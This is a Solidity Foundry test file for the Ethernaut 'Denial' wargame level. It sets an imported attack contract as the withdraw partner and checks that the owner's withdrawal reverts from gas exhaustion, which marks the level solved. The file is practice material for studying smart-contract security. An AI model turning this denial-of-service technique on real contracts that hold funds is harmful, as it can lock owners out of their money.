// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import { PRBTest } from "@prb/test/PRBTest.sol";
import { console } from "forge-std/console.sol";

import { Ethernaut } from "src/Ethernaut.sol";
import { Denial } from "src/Denial/Denial.sol";
import { DenialFactory } from "src/Denial/DenialFactory.sol";
import { DenialAttack } from "src/Denial/DenialAttack.sol";

contract DenialAttackTest is PRBTest {
    Ethernaut public ethernaut;
    DenialFactory public factory;
    address public denialInstance;
    address public playerAddress = address(0x696969);

    DenialAttack attacker = new DenialAttack();

    function setUp() public {
        vm.startPrank(playerAddress);
        vm.deal(playerAddress, 69 ether);
        ethernaut = new Ethernaut();
        factory = new DenialFactory();

        ethernaut.registerLevel(factory);
        denialInstance = ethernaut.createLevelInstance{ value: 0.123 ether }(factory);
        vm.stopPrank();
    }

    // test with withrawPartner set directly
    function testDenialAttack() public {
        // set our attack contract as a withdraw partner
        Denial(payable(denialInstance)).setWithdrawPartner(address(attacker));
        // get the owner address from the Denial contract
        address owner = Denial(payable(denialInstance)).owner();

        // act as owner; ensure balance doesn't increase on withdraw
        vm.startPrank(owner, owner);
        uint ownerBalanceBefore = owner.balance;
        vm.expectRevert();
        Denial(payable(denialInstance)).withdraw{gas: 1_000_000}();
        uint ownerBalanceAfter = owner.balance;
        console.log("balance before:", ownerBalanceBefore);
        console.log("balance after:", ownerBalanceAfter);
        assert(ownerBalanceBefore == ownerBalanceAfter);
        vm.stopPrank();

        // test to make sure we completed the level
        vm.startPrank(playerAddress, playerAddress);
        // submit level as player
        bool levelComplete = ethernaut.submitLevelInstance(payable(denialInstance));
        assert(levelComplete);
        vm.stopPrank();
    }

    // test with withdrawPartner set as part of attack contract
    function testDenialAttack2() public {
        // instigate the attack
        DenialAttack(attacker).attack(denialInstance);
        // get the owner address from the Denial contract
        address owner = Denial(payable(denialInstance)).owner();

        // act as owner; ensure balance doesn't increase on withdraw
        vm.startPrank(owner, owner);
        uint ownerBalanceBefore = owner.balance;
        vm.expectRevert();
        Denial(payable(denialInstance)).withdraw{gas: 1_000_000}();
        uint ownerBalanceAfter = owner.balance;
        console.log("balance before:", ownerBalanceBefore);
        console.log("balance after:", ownerBalanceAfter);
        assert(ownerBalanceBefore == ownerBalanceAfter);
        vm.stopPrank();

        // test to make sure we completed the level
        vm.startPrank(playerAddress, playerAddress);
        // submit level as player
        bool levelComplete = ethernaut.submitLevelInstance(payable(denialInstance));
        assert(levelComplete);
        vm.stopPrank();
    }

}
